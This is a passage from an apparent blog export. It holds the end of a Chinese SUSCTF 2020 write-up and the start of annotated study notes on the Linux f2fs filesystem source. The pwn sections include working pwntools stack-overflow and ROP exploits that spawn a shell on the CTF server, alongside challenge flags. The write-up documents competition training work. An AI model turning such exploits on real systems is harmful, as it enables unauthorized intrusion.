<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-60h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x60</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Such easy rop&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Leave something: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li><p>read存在栈溢出漏洞，填入0x68个’a’就可达返回地址，但是broken_backdoor只能<code>ls</code>，并不是我们想要的，所以需要构造ROP<br><a href="https://blog.csdn.net/michaelinfinity/article/details/88584349">类似题目</a>  </p>
</li>
<li><p>可通过IDA直接SHIFT+F12找到<code>/bin/sh</code>地址为0x601050<br><img src="/2020/10/20/SUS2020/babyropbin.png" alt>  </p>
</li>
<li>函数窗口查看<code>_system()</code>地址0x400540<br><img src="/2020/10/20/SUS2020/babyropsys.png" alt>  </li>
<li>因为传入一个参数，所以需要知道rdi地址，利用<code>ROPgadget --binary babyrop --only &#39;pop|ret&#39; | grep rdi</code>可得0x400763，所以先覆盖’a’再填入rdi再放binsh再加system即可执行  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;146.56.223.95&#x27;</span>, <span class="number">20007</span>)</span><br><span class="line">rdi = <span class="number">0x400763</span></span><br><span class="line">binsh = <span class="number">0x601050</span></span><br><span class="line">sys_addr = <span class="number">0x400540</span></span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x60</span>+<span class="number">8</span>)+p64(rdi)+p64(binsh)+p64(sys_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><code>SUSCTF&#123;29b76a5fedeb34b78d4284e896ced52f&#125;</code></p>
<h4 id="Pwn-babydoor"><a href="#Pwn-babydoor" class="headerlink" title="[Pwn]babydoor"></a>[Pwn]babydoor</h4><h5 id="解题思路-16"><a href="#解题思路-16" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li><p><code>checksec babydoor</code>  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little  </span><br><span class="line">    RELRO:    Partial RELRO  </span><br><span class="line">    Stack:    No canary found  </span><br><span class="line">    NX:       NX enabled  </span><br><span class="line">    PIE:      No PIE (0x400000)  </span><br></pre></td></tr></table></figure>
</li>
<li><p>IDA64打开，F5，找到<code>main()</code>  </p>
</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-60h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x60</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Such easy ret2text&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Leave something: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x70</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>read存在栈溢出漏洞，传入<code>&#39;a&#39;*0x68</code>即可到达返回地址，exp如下  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;146.56.223.95&#x27;</span>, <span class="number">20008</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x68</span> + p64(<span class="number">0x400676</span>) + p64(<span class="number">0x4006fb</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h4 id="Pwn-snake"><a href="#Pwn-snake" class="headerlink" title="[Pwn]snake"></a>[Pwn]snake</h4><h5 id="解题思路-17"><a href="#解题思路-17" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>ssh连上，<code>./snake</code>，然后就硬玩<br><img src="/2020/10/20/SUS2020/snake.png" alt></li>
</ol>
<h4 id="Reverse-迷宫"><a href="#Reverse-迷宫" class="headerlink" title="[Reverse]迷宫"></a>[Reverse]迷宫</h4><h5 id="解题思路-18"><a href="#解题思路-18" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>在IDA中反编译后找到<br><img src="/2020/10/20/SUS2020/maze.png" alt>  </li>
<li>猜测是个迷宫矩阵，故按8x8排列得到<br><img src="/2020/10/20/SUS2020/modimaze.png" alt>  </li>
<li>所以出迷宫的方法是：LLLDDRDRRDDLLLD  </li>
<li><code>./babymaze</code>然后输入以上字符串得结果<br><code>SUSCTF&#123;DLLLDDRRDRDDLLLLLLDDRDRRDDLLLD&#125;</code>  </li>
</ol>
<h4 id="Reverse-表面"><a href="#Reverse-表面" class="headerlink" title="[Reverse]表面"></a>[Reverse]表面</h4><h5 id="解题思路-19"><a href="#解题思路-19" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>用IDA打开，在<code>main()</code>中注意到有一个wrongans很可疑，查看一下，在其相邻的地方有<br><img src="/2020/10/20/SUS2020/rawBanner.png" alt>  </li>
<li>这就很有意思了，太像一个Banner了，其中还有0x0AH的格式，猜想是需要重新调整格式得到想要的flag，用文本编辑器调一下即可，得到<br><img src="/2020/10/20/SUS2020/babysigninBanner.png" alt>  </li>
<li>调整一下宽高明显点<br><img src="/2020/10/20/SUS2020/newBabysigninBanner.png" alt><br>所见即所得<br><code>SUS&#123;all_the_alphabets&#125;</code>  </li>
</ol>
<h4 id="Reverse-静置"><a href="#Reverse-静置" class="headerlink" title="[Reverse]静置"></a>[Reverse]静置</h4><h5 id="解题思路-20"><a href="#解题思路-20" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>拖到IDA反编译，SHIFT+F12查看字符串<br><img src="/2020/10/20/SUS2020/babyre.png" alt>  </li>
<li>查看mov<br><img src="/2020/10/20/SUS2020/babyremov.png" alt>  </li>
<li>16进制转ASCII即可  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">lst = [<span class="number">0x53</span>, <span class="number">0x55</span>, <span class="number">0x53</span>, <span class="number">0x43</span>, <span class="number">0x54</span>, <span class="number">0x46</span>, <span class="number">0x7B</span>, <span class="number">0x57</span>, <span class="number">0x33</span>, <span class="number">0x6C</span>, <span class="number">0x63</span>, <span class="number">0x6F</span>, <span class="number">0x6D</span>, <span class="number">0x65</span>, <span class="number">0x5F</span>, <span class="number">0x74</span>, <span class="number">0x6F</span>, <span class="number">0x5F</span>,</span><br><span class="line">       <span class="number">0x53</span>, <span class="number">0x55</span>, <span class="number">0x53</span>, <span class="number">0x43</span>, <span class="number">0x54</span>, <span class="number">0x46</span>, <span class="number">0x5F</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0x5F</span>, <span class="number">0x52</span>, <span class="number">0x45</span>, <span class="number">0x23</span>, <span class="number">0x7D</span>]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lst:</span><br><span class="line">    flag += <span class="built_in">chr</span>(i)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p><code>SUSCTF&#123;W3lcome_to_SUSCTF_2020_RE#&#125;</code></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>linux_f2fs_super_cp_recv</title>
    <url>/2020/02/29/linux-f2fs-super-cp-recv/</url>
    <content><![CDATA[<h1 id="Linux-v3-8-rc1"><a href="#Linux-v3-8-rc1" class="headerlink" title="Linux v3.8-rc1"></a>Linux v3.8-rc1</h1><h2 id="super-c"><a href="#super-c" class="headerlink" title="super.c"></a>super.c</h2><h3 id="f2fs-alloc-inode-从缓存中申请内存后，初始化具体的inode信息并设定标志，返回vfs-inode"><a href="#f2fs-alloc-inode-从缓存中申请内存后，初始化具体的inode信息并设定标志，返回vfs-inode" class="headerlink" title="f2fs_alloc_inode // 从缓存中申请内存后，初始化具体的inode信息并设定标志，返回vfs_inode"></a>f2fs_alloc_inode // 从缓存中申请内存后，初始化具体的inode信息并设定标志，返回vfs_inode</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* struct inode 和 struct super_block 在/include/linux/fs.h中*/</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct inode *<span class="title">f2fs_alloc_inode</span><span class="params">(struct super_block *sb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">f2fs_inode_info</span> *<span class="title">fi</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 调用kmem_cache_alloc从缓存中申请内存。</span></span><br><span class="line"><span class="comment">     * f2fs_inode_cachep是可以指向任意kmem_cache类型的结构体指针</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 内存分配掩码Get Free Page Mask</span></span><br><span class="line"><span class="comment">     * GFP_NOFS：分配内存时，禁止任何文件系统操作</span></span><br><span class="line"><span class="comment">     * __GFP_ZERO：分配器在分配成功时，将返回填充字节0的页</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    fi = kmem_cache_alloc(f2fs_inode_cachep, GFP_NOFS | __GFP_ZERO);</span><br><span class="line">    <span class="keyword">if</span> (!fi)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    init_once((<span class="keyword">void</span> *) fi);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Initilize f2fs-specific inode info */</span></span><br><span class="line">    fi-&gt;vfs_inode.i_version = <span class="number">1</span>;</span><br><span class="line">    atomic_set(&amp;fi-&gt;dirty_dents, <span class="number">0</span>);</span><br><span class="line">    fi-&gt;current_depth = <span class="number">1</span>;</span><br><span class="line">    fi-&gt;is_cold = <span class="number">0</span>;</span><br><span class="line">    rwlock_init(&amp;fi-&gt;ext.ext_lock);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设定索引节点的标志（FI_NEW_INODE为枚举类型，表明新分配的索引节点）</span></span><br><span class="line">    set_inode_flag(fi, FI_NEW_INODE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &amp;fi-&gt;vfs_inode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="f2fs-i-callback-进程结束后把进程信息存放到缓存中"><a href="#f2fs-i-callback-进程结束后把进程信息存放到缓存中" class="headerlink" title="f2fs_i_callback // 进程结束后把进程信息存放到缓存中"></a>f2fs_i_callback // 进程结束后把进程信息存放到缓存中</h3><p>调用<code>container_of</code>(macro在include/linux/kernel.h中)使指针head指向inode结构体的成员变量i_rcu, 把整个inode结构体的指针都存放在<code>struct inode *inode</code>，再调用<code>F2FS_I</code>函数通过inode指针指向f2fs_inode_info中的成员vfs_inode，通过inode指针返回结构体f2fs_inode_info的起始地址。然后调用<code>kmem_cache_free</code>函数把前面返回的结构体地址保存到f2fs_inode_cachep。</p>
<h3 id="f2fs-destroy-inode-销毁旧的inode指针"><a href="#f2fs-destroy-inode-销毁旧的inode指针" class="headerlink" title="f2fs_destroy_inode // 销毁旧的inode指针"></a>f2fs_destroy_inode // 销毁旧的inode指针</h3><h3 id="f2fs-put-super-释放内存"><a href="#f2fs-put-super-释放内存" class="headerlink" title="f2fs_put_super // 释放内存"></a>f2fs_put_super // 释放内存</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">f2fs_put_super</span><span class="params">(struct super_block *sb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * F2FS_SB in /fs/f2fs/f2fs.h</span></span><br><span class="line"><span class="comment">     * 把sb指向结构体super_block的子数据s_fs_info指针并将其赋给sbi</span></span><br><span class="line"><span class="comment">     * s_fs_info指向特定文件系统的超级块信息</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">f2fs_sb_info</span> *<span class="title">sbi</span> =</span> F2FS_SB(sb);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_F2FS_STAT_FS <span class="comment">// 如果宏已经定义，则编译下面代码</span></span></span><br><span class="line">    <span class="keyword">if</span> (sbi-&gt;s_proc) &#123;</span><br><span class="line">        f2fs_stat_exit(sbi);</span><br><span class="line">        remove_proc_entry(sb-&gt;s_id, f2fs_proc_root);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    stop_gc_thread(sbi); <span class="comment">// 停止gc线程</span></span><br><span class="line"></span><br><span class="line">    write_checkpoint(sbi, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    iput(sbi-&gt;node_inode); <span class="comment">// 如果索引节点使用计数达到零，则索引节点将被释放或销毁</span></span><br><span class="line">    iput(sbi-&gt;meta_inode);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* destroy f2fs internal modules */</span></span><br><span class="line">    destroy_gc_manager(sbi);</span><br><span class="line">    destroy_node_manager(sbi);</span><br><span class="line">    destroy_segment_manager(sbi);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * kfree释放先前分配的内存</span></span><br><span class="line"><span class="comment">     * sbi-&gt;ckpt：kmalloc返回的指针。 如果sbi-&gt;ckpt为NULL，则不执行任何操作</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    kfree(sbi-&gt;ckpt);</span><br><span class="line"></span><br><span class="line">    sb-&gt;s_fs_info = <span class="literal">NULL</span>;</span><br><span class="line">    brelse(sbi-&gt;raw_super_buf);</span><br><span class="line">    kfree(sbi);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="f2fs-statfs-获取f2fs使用情况"><a href="#f2fs-statfs-获取f2fs使用情况" class="headerlink" title="f2fs_statfs // 获取f2fs使用情况"></a>f2fs_statfs // 获取f2fs使用情况</h3><p>如block大小和数目。可使用的有效block数目，有效的inode数目，有效的node数目</p>
<h3 id="f2fs-show-options-属性显示"><a href="#f2fs-show-options-属性显示" class="headerlink" title="f2fs_show_options // 属性显示"></a>f2fs_show_options // 属性显示</h3><p>如有操作，如“后台清理”、“关闭前滚”、“无堆分配”等情况出现，向seq流中写入相应的字符串如”,background_gc_on”</p>
<h3 id="parse-options-解析属性，与f2fs-show-options关联，认为两者与项目无关"><a href="#parse-options-解析属性，与f2fs-show-options关联，认为两者与项目无关" class="headerlink" title="parse_options // 解析属性，与f2fs_show_options关联，认为两者与项目无关"></a>parse_options // 解析属性，与f2fs_show_options关联，认为两者与项目无关</h3><h3 id="max-file-size-通过索引节点中的地址指针，直接块中的地址指针，间接块中的节点ID计算最大文件大小"><a href="#max-file-size-通过索引节点中的地址指针，直接块中的地址指针，间接块中的节点ID计算最大文件大小" class="headerlink" title="max_file_size // 通过索引节点中的地址指针，直接块中的地址指针，间接块中的节点ID计算最大文件大小"></a>max_file_size // 通过索引节点中的地址指针，直接块中的地址指针，间接块中的节点ID计算最大文件大小</h3><h3 id="sanity-check-raw-super-原始super的健全性检查"><a href="#sanity-check-raw-super-原始super的健全性检查" class="headerlink" title="sanity_check_raw_super // 原始super的健全性检查"></a>sanity_check_raw_super // 原始super的健全性检查</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">sanity_check_raw_super</span><span class="params">(struct f2fs_super_block *raw_super)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> blocksize;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查魔数magic是否为F2FS_SUPER_MAGIC</span></span><br><span class="line">    <span class="keyword">if</span> (F2FS_SUPER_MAGIC != le32_to_cpu(raw_super-&gt;magic))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    blocksize = <span class="number">1</span> &lt;&lt; le32_to_cpu(raw_super-&gt;log_blocksize);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 检查块大小和页大小是否一致（f2fs文件系统的设计上是一致的）</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (blocksize != PAGE_CACHE_SIZE)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="sanity-check-ckpt-checkpoint的健全性检查"><a href="#sanity-check-ckpt-checkpoint的健全性检查" class="headerlink" title="sanity_check_ckpt // checkpoint的健全性检查"></a>sanity_check_ckpt // checkpoint的健全性检查</h3><p>如果ckpt, sit, nat, ssa各自的segment数之和加上gc的保留段数 小于等于 segment总数，则通过健全性检查</p>
<h3 id="init-sb-info-对f2fs-sb-info进行初始化"><a href="#init-sb-info-对f2fs-sb-info进行初始化" class="headerlink" title="init_sb_info // 对f2fs_sb_info进行初始化"></a>init_sb_info // 对f2fs_sb_info进行初始化</h3><h3 id="f2fs-fill-super-读取磁盘的前端区域的数据，对F2FS元区域数据进行初始化"><a href="#f2fs-fill-super-读取磁盘的前端区域的数据，对F2FS元区域数据进行初始化" class="headerlink" title="f2fs_fill_super // 读取磁盘的前端区域的数据，对F2FS元区域数据进行初始化"></a>f2fs_fill_super // 读取磁盘的前端区域的数据，对F2FS元区域数据进行初始化</h3><p><code>f2fs_fill_super</code> 是加载F2FS文件系统的第一步，主要<strong>作用</strong>是读取磁盘的前端区域的数据，对F2FS元区域数据进行初始化。  </p>
<blockquote>
<p>1 首先调用<code>kzalloc</code>为特定f2fs的超级块信息分配内存<br>2 设定一个临时的块大小<br>3 调用<code>sb_bread</code>读取原始超级块的信息<br>4 调用<code>set_opt</code>初始化FS参数<br>5 调用<code>parse_options</code>解析安装属性<br>6 对原始super进行健全性检查<br>7 初始化特定的超级块信息，如用于gc, cp, write_inode, writepages的互斥量<br>8 调用<code>f2fs_iget</code>获取元空间的索引节点<br>9 对cp做健全性检查<br>10 调用<code>init_orphan_info</code>初始化超级块orphan信息<br>11 依次调用<code>build_segment_manager</code>, <code>build_node_manager</code>, <code>build_gc_manager</code>设置f2fs内部模块<br>12 调用<code>recover_orphan_inodes</code>恢复孤立节点，有则释放它们<br>13 调用<code>f2fs_iget</code>获取根索引节点和目录项<br>14 调用<code>recover_fsync_data</code>恢复（与数据的同步写入磁盘相关）<br>15 运行后台GC线程</p>
</blockquote>
<p>这个初始化函数中与后滚恢复相关的函数有<code>get_valid_checkpoint</code>和<code>build_segment_manager</code>,分别对应<code>f2fs_checkpoint</code>相关的数据和curseg相关的数据  </p>
<h4 id="get-valid-checkpoint-恢复f2fs-checkpoint"><a href="#get-valid-checkpoint-恢复f2fs-checkpoint" class="headerlink" title="get_valid_checkpoint // 恢复f2fs_checkpoint"></a>get_valid_checkpoint // 恢复<code>f2fs_checkpoint</code></h4><p><strong>定义</strong>在fs/f2fs/checkpoint.c中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// struct f2fs_sb_info在/fs/f2fs/f2fs.h中</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_valid_checkpoint</span><span class="params">(struct f2fs_sb_info *sbi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">f2fs_checkpoint</span> *<span class="title">cp_block</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * sbi指向f2fs_sb_info结构体的子数据raw_super, 是一个原始超级块指针</span></span><br><span class="line"><span class="comment">     * raw_super指向f2fs_super_block类型的任意结构体</span></span><br><span class="line"><span class="comment">     * 这里相当于fsb就是原来的超级块指针</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">f2fs_super_block</span> *<span class="title">fsb</span> =</span> sbi-&gt;raw_super;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">cp1</span>, *<span class="title">cp2</span>, *<span class="title">cur_page</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> blk_size = vsbi-&gt;blocksize;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> cp1_version = <span class="number">0</span>, cp2_version = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> cp_start_blk_no;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * kzalloc在include/linux/slab.h中</span></span><br><span class="line"><span class="comment">     * blk_size是需要分配的内存大小, GFP_KERNEL为要分配的内存类型</span></span><br><span class="line"><span class="comment">     * 查询&quot;内存分配掩码&quot;知: GFP_KERNEL是一种常规的分配方式，可能会阻塞。</span></span><br><span class="line"><span class="comment">     * 这个标志在睡眠安全时用在进程的长下文代码中。</span></span><br><span class="line"><span class="comment">     * 为了获取调用者所需的内存，内核会尽力而为。这个标志应该是首选标志.</span></span><br><span class="line"><span class="comment">     * ckpt是原始checkpoint指针, 指向f2fs_checkpoint类型的任意结构体</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    sbi-&gt;ckpt = kzalloc(blk_size, GFP_KERNEL); <span class="comment">// 分配f2fs_checkpoint的堆空间</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如上述操作未完成, 说明内存不足</span></span><br><span class="line">    <span class="keyword">if</span> (!sbi-&gt;ckpt)</span><br><span class="line">        <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 找到并读取两个cp</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    cp_start_blk_no = le64_to_cpu(fsb-&gt;start_segment_checkpoint); <span class="comment">// 从sbi获得checkpoint的起始地址</span></span><br><span class="line">    cp1 = validate_checkpoint(sbi, cp_start_blk_no, &amp;cp1_version); <span class="comment">// 读取该地址并检查其合法性</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The second checkpoint pack should start at the next segment */</span></span><br><span class="line">    cp_start_blk_no += <span class="number">1</span> &lt;&lt; le32_to_cpu(fsb-&gt;log_blocks_per_seg);</span><br><span class="line">    cp2 = validate_checkpoint(sbi, cp_start_blk_no, &amp;cp2_version);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (cp1 &amp;&amp; cp2) &#123; <span class="comment">// 根据版本的高低决定使用哪个版本的cp</span></span><br><span class="line">        <span class="keyword">if</span> (ver_after(cp2_version, cp1_version))</span><br><span class="line">            cur_page = cp2;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            cur_page = cp1;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cp1) &#123;</span><br><span class="line">        cur_page = cp1;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cp2) &#123;</span><br><span class="line">        cur_page = cp2;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">goto</span> fail_no_cp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// page_address返回页面的虚拟地址, 这个cur_page就是以上获取的正在使用的checkpoint</span></span><br><span class="line">    cp_block = (struct f2fs_checkpoint *)page_address(cur_page);</span><br><span class="line">    <span class="built_in">memcpy</span>(sbi-&gt;ckpt, cp_block, blk_size); <span class="comment">// 复制数据到sbi中，用于运行中的管理</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* f2fs_put_page在/fs/f2fs/f2fs.h中</span></span><br><span class="line"><span class="comment">     * 查看!PageLocked(cp1)和!PageLocked(cp1)时的堆栈信息.</span></span><br><span class="line"><span class="comment">     * 解除cp1和cp2的锁定并释放页面缓存</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    f2fs_put_page(cp1, <span class="number">1</span>);</span><br><span class="line">    f2fs_put_page(cp2, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">fail_no_cp:</span><br><span class="line">    kfree(sbi-&gt;ckpt);</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="build-segment-manager-恢复curseg"><a href="#build-segment-manager-恢复curseg" class="headerlink" title="build_segment_manager // 恢复curseg"></a>build_segment_manager // 恢复curseg</h4><p>恢复curseg的功能主要在<code>build_segment_manager</code>函数的<code>build_curseg</code>函数中完成<br>build_segment_manager和build_curseg<strong>定义</strong>在fs/f2fs/segment.c  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">build_curseg</span><span class="params">(struct f2fs_sb_info *sbi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">curseg_info</span> *<span class="title">array</span>;</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">array</span> = kzalloc(<span class="keyword">sizeof</span>(*<span class="built_in">array</span>) * NR_CURSEG_TYPE, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">array</span>)</span><br><span class="line">        <span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">    SM_I(sbi)-&gt;curseg_array = <span class="built_in">array</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化curseg的空间</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NR_CURSEG_TYPE; i++) &#123;</span><br><span class="line">        mutex_init(&amp;<span class="built_in">array</span>[i].curseg_mutex);</span><br><span class="line">        <span class="built_in">array</span>[i].sum_blk = kzalloc(PAGE_CACHE_SIZE, GFP_KERNEL);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">array</span>[i].sum_blk)</span><br><span class="line">            <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">        <span class="built_in">array</span>[i].segno = NULL_SEGNO;</span><br><span class="line">        <span class="built_in">array</span>[i].next_blkoff = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从磁盘中，读取恢复curseg的信息</span></span><br><span class="line">    <span class="keyword">return</span> restore_curseg_summaries(sbi);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="restore-curseg-summaries-读取curseg"><a href="#restore-curseg-summaries-读取curseg" class="headerlink" title="restore_curseg_summaries // 读取curseg"></a>restore_curseg_summaries // 读取curseg</h5><p>function in /fs/f2fs/segment.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">restore_curseg_summaries</span><span class="params">(struct f2fs_sb_info *sbi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> type = CURSEG_HOT_DATA;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 检查CP_COMPACT_SUM_FLAG的标志，这个标志用于检查是否按COMPACTED的方式读取data summary</span></span><br><span class="line"><span class="comment">     * is_set_ckpt_flags fs/f2fs/f2fs.h, line 467 (as a function)</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (is_set_ckpt_flags(F2FS_CKPT(sbi), CP_COMPACT_SUM_FLAG)) &#123;</span><br><span class="line">        <span class="comment">/* restore for compacted data summary */</span></span><br><span class="line">        <span class="keyword">if</span> (read_compacted_summaries(sbi))</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span 